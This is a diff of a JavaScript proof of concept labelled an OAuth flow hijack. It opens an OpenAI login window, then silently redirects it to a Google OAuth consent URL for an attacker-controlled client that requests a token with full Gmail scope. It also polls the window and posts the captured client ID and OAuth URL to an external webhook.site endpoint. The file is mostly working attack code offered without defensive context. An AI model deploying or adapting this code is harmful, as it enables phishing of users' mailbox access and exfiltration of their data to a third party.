@@ -1,26 +1,44 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>OAuth Hijack Test</title>
-</head>
-<body>
-  <h2>OAuth Flow Hijack PoC</h2>
-  <button onclick="launch()">Start Attack</button>
+<script>
+  const loginTarget = "https://auth.openai.com/log-in";
+  const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
 
-  <script>
-    const loginTarget = ""
-    const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
-    function launch() {
-      const win = window.open(loginTarget, "_blank", "width=900,height=700");
-      setTimeout(() => {
-        try {
-          win.location.replace(maliciousOAuthUrl);
-          console.log("Redirected login window to malicious OAuth client.");
-        } catch (err) {
-          console.warn("Window manipulation blocked:", err);
+  function launch() {
+    const win = window.open(loginTarget, "_blank", "width=900,height=700");
+
+    // Attempt to hijack the flow after 3 seconds
+    setTimeout(() => {
+      try {
+        win.location.replace(maliciousOAuthUrl);
+        console.log("Redirected login window to malicious OAuth client.");
+      } catch (err) {
+        console.warn("Window manipulation blocked:", err);
+      }
+    }, 3000);
+
+    // Monitor for legitimate client_id being revealed in the OAuth redirect
+    const interval = setInterval(() => {
+      try {
+        const loc = win.location.href;
+        if (loc.includes("accounts.google.com/o/oauth2/v2/auth")) {
+          const url = new URL(loc);
+          const clientId = url.searchParams.get("client_id");
+
+          // Send captured client_id and full OAuth URL to webhook
+          fetch("https://webhook.site/b90ffbf8-2d0e-4734-9487-d6b9cd9e94df", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              client_id: clientId,
+              full_url: loc
+            })
+          });
+
+          clearInterval(interval);
+          console.log("Captured client_id:", clientId);
         }
-      }, 3000);
-    }
-  </script>
-</body>
-</html>
+      } catch (err) {
+        // Ignore cross-origin frame errors until redirect occurs
+      }
+    }, 500);
+  }
+</script>
